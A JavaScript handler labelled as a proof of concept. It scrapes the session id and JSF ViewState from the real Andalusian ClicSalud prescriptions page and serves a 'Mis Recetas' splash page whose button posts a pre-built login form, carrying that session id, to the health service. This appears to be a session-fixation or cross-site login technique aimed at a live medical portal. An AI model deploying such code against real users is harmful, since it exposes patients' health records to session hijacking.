export async function handlePoc(request, env) {
  const targetUrl = env.TARGET_URL || 'https://www.sspa.juntadeandalucia.es/servicioandaluzdesalud/clicsalud/pages/anonimo/historia/medicacion/medicacionActiva.jsf?opcionSeleccionada=MUMEDICACION';
  const userAgent = request.headers.get('User-Agent') || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36';

  try {
    const response = await fetch(targetUrl, {
      headers: { 'User-Agent': userAgent }
    });

    const html = await response.text();
    const match = html.match(/id="javax.faces.ViewState" value="([^"]+)"/);
    const viewState = match ? match[1] : '';

    if (!viewState) {
      return new Response('Error: No se pudo conectar con el servicio de salud.', { status: 500 });
    }

    const setCookie = response.headers.get('Set-Cookie');
    const jsMatch = setCookie ? setCookie.match(/JSESSIONID=([^;]+)/) : null;
    const jsessionid = jsMatch ? jsMatch[1] : null;

    const actionUrl = jsessionid
      ? `https://www.sspa.juntadeandalucia.es/servicioandaluzdesalud/clicsalud/pages/anonimo/historia/medicacion/medicacionActiva.jsf;jsessionid=${jsessionid}?opcionSeleccionada=MUMEDICACION`
      : targetUrl;

    const splashHtml = `
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Mis Recetas</title>
    <link rel="manifest" href="/manifest.json">
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><rect width=%22100%22 height=%22100%22 rx=%2220%22 fill=%22%232563eb%22/><path d=%22M30 35h40v40H30z%22 fill=%22white%22/><rect x=%2245%22 y=%2220%22 width=%2210%22 height=%2220%22 rx=%222%22 fill=%22%232563eb%22/><path d=%22M40 55h20M50 45v20%22 stroke=%22%232563eb%22 stroke-width=%228%22 stroke-linecap=%22round%22/></svg>">
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #f1f5f9; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; text-align: center; color: #1e293b; }
        .card { background: white; padding: 3rem 2rem; border-radius: 2.5rem; box-shadow: 0 10px 25px rgba(0,0,0,0.05); max-width: 480px; width: 90%; box-sizing: border-box; }
        h1 { font-size: 2.2rem; margin-bottom: 1.5rem; color: #0f172a; }
        p { font-size: 1.2rem; line-height: 1.6; color: #475569; margin-bottom: 2.5rem; }
        .spinner { border: 6px solid #f1f5f9; border-top: 6px solid #2563eb; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto 2.5rem; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn { background: #2563eb; color: white; border: none; padding: 22px 30px; border-radius: 1.2rem; font-size: 1.5rem; font-weight: 800; display: none; width: 100%; box-sizing: border-box; box-shadow: 0 10px 20px rgba(37, 99, 235, 0.3); cursor: pointer; }
        .btn:active { transform: scale(0.98); }
    </style>
</head>
<body>
    <div class="card">
        <div id="splash">
            <div class="spinner"></div>
            <h1>Iniciando</h1>
            <p>Conectando con el Servicio de Salud...</p>
        </div>
        
        <div id="action" style="display:none;">
            <h1 style="font-size: 2.5rem;">¡Bienvenido!</h1>
            <p>Pulse el botón de abajo para entrar con su certificado.</p>
            <button onclick="doLogin()" class="btn" id="login-btn" style="display:block;">ENTRAR AHORA</button>
        </div>
    </div>

    <form id="auth-form" method="POST" action="${actionUrl}" style="display:none;">
        <input type="hidden" name="frm-body" value="frm-body">
        <input type="hidden" name="nameUrl" value="${targetUrl}">
        <input type="hidden" name="lnkAfirma" value="Certificado digital o DNIe">
        <input type="hidden" name="javax.faces.ViewState" value="${viewState}">
    </form>

    <script>
        function doLogin() {
            document.getElementById('auth-form').submit();
        }

        // Mostrar pantalla de acción tras un breve splash premium
        setTimeout(() => {
            document.getElementById('splash').style.display = 'none';
            document.getElementById('action').style.display = 'block';
        }, 1200);
    </script>
</body>
</html>
    `;

    return new Response(splashHtml, {
      headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' }
    });
  } catch (err) {
    return new Response('Error en POC.', { status: 500 });
  }
}


